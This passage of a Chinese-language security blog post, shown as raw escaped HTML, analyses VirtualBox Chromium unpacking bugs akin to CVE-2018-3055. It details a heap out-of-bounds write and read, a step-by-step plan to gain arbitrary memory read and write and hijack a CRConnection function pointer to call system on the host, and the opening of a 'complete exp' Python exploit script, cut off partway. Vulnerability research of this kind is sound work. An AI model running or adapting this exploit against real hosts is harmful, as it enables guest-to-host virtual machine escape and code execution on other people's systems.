class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;\0&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;Assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;\n&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//    cr_unpackDispatch.ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cr_unpackDispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ShaderSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;crFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    仔细看会发现在中间一段for循环检查pLocalLength数组的每个元素跟所有元素的和的大小是否越界时，并未检查最后一层循环过后pos_check是否越界，据此我们可以在最后的两层嵌套循环中的内层中实现越界写，而这个越界写也很有趣：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span&gt;&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;\0&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;Assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;\n&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    它可以将越界部分所有的&#39;\0&#39;替换为&#39;\n&#39;。通过这个漏洞我们可以越界写一块堆内存，将其后面内存中若干的&#39;\0&#39;替换为&#39;\n&#39;。（注意：Assert在release版中是不存在的！）之后我们会介绍如何通过这个越界写实现任意地址写。&lt;/p&gt;&lt;p&gt;    当然只有一个越界写可能利用起来还是十分困难，我们仔细看了看niklasb写的文章，发现在很多类似的unpack函数中均存在类似于CVE-2018-3055的漏洞，比如crUnpackExtendGetUniformLocation：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;crUnpackExtendGetUniformLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;READ_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GLuint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;program&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;READ_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLuint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DATA_POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SET_RETURN_PTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SET_WRITEBACK_PTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cr_unpackDispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetUniformLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;program&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    漏洞的成因完全与CVE-2018-3055相同，简单来说SET_RETURN_PTR和SET_WRITEBACK_PTR指向的内存会写回到guest，而这里因为没有对packet_length做对应的检查导致我们可以在堆上实现越界读。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞利用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;    通过以上的代码分析，我们现在有一个堆越界读和一个堆越界写，接下来我们来分析如何去完成完整的漏洞利用。&lt;/p&gt;&lt;p&gt;    因为信息泄露部分完全与CVE-2018-3055基本相同，我们选择直接复用niklasb之前的exp leak部分的代码。重写make_oob_read后通过leak_stuff我们可以泄露一个CRConnection结构体的位置，而niklasb的exp中就是通过修改pHostBuffer和cbHostBuffer来实现任意地址读。因此，当我们有任意地址写的条件之后我们就可以任意地址读了。&lt;/p&gt;&lt;p&gt;    接下来的关键就是如何用我们神奇的堆溢出来实现任意地址写了。@kelwin找到了一个很好用的结构体CRVBOXSVCBUFFER_t，也就是niklasb的代码中alloc_buf使用的结构体：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_CRVBOXSVCBUFFER_t&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uiId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uiSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;pData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_CRVBOXSVCBUFFER_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pNext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pPrev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CRVBOXSVCBUFFER_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    如果可以在堆上我们可以越界写的内存后面恰好布置这样一个结构体，越界写它对应的uiSize部分，再通过SHCRGL_GUEST_FN_WRITE_BUFFER就可以越界写这个buffer所对应的pData的内容，之后再越界写另一个相同的结构体，就可以实现任意地址写了。实现任意地址写的具体过程如下：&lt;/p&gt;&lt;p&gt;1.n次调用alloc_buf，对应的buffer填充为可以触发越界写的部分，从而确保在我们可以越界写的堆后有可用的CRVBOXSVCBUFFER_t结构体。此时内存分布如下：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1028&quot; data-rawheight=&quot;742&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1028&quot; data-original=&quot;https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1028&quot; data-rawheight=&quot;742&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1028&quot; data-original=&quot;https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;2.通过SHCRGL_GUEST_FN_WRITE_READ使用第n-3个buffer，触发堆越界写，覆盖掉第n-2个buffer的size部分。此时内存分布如下：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1014&quot; data-rawheight=&quot;742&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1014&quot; data-original=&quot;https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1014&quot; data-rawheight=&quot;742&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1014&quot; data-original=&quot;https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;3.通过SHCRGL_GUEST_FN_WRITE使用第n-2个buffer，触发堆越界写，可以修改第n-1个buffer的uiSize和pData为任意值。此时内存分布如下：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1110&quot; data-rawheight=&quot;738&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1110&quot; data-original=&quot;https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1110&quot; data-rawheight=&quot;738&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1110&quot; data-original=&quot;https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;4.通过SHCRGL_GUEST_FN_WRITE使用第n-1个buffer，触发任意地址写，写的地址与长度由步骤3控制&lt;/p&gt;&lt;p&gt;5.多次任意地址写可以通过多次反复SHCRGL_GUEST_FN_WRITE第n-2个buffer和第n-1个buffer实现&lt;/p&gt;&lt;p&gt;    在有了任意读和任意写的能力之后，我们可以修改某个CRConnection结构体中disconnect函数指针来劫持rip，通过修改CRConnection头部的数据可以控制对应的参数。所以漏洞利用的完整过程如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;通过越界读泄露一个CRConnection结构体的位置&lt;/li&gt;&lt;li&gt;配置内存实现任意地址写&lt;/li&gt;&lt;li&gt;通过任意地址读泄露CRConnection结构体中alloc函数对应地址&lt;/li&gt;&lt;li&gt;通过alloc函数地址计算VBoxOGLhostcrutil.so库地址，最终泄露libc地址&lt;/li&gt;&lt;li&gt;修改CRConnection的disconnect函数指针为system&lt;/li&gt;&lt;li&gt;修改CRConnection的头部为payload&lt;/li&gt;&lt;li&gt;disconnect对应的client&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;完整exp：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;#!/usr/bin/env python2&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;__future__&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;print_function&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__file__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;/lib&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;chromium&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hgcm&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;make_oob_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_GETUNIFORMLOCATION_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;LEET&#39;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;leak_conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;sd&quot;&gt;&#39;&#39;&#39; Return a CRConnection address, and the associated client handle &#39;&#39;&#39;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# Spray some buffers of sizes&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#  0x290 = sizeof(CRConnection) and&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#  0x9d0 = sizeof(CRClient)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
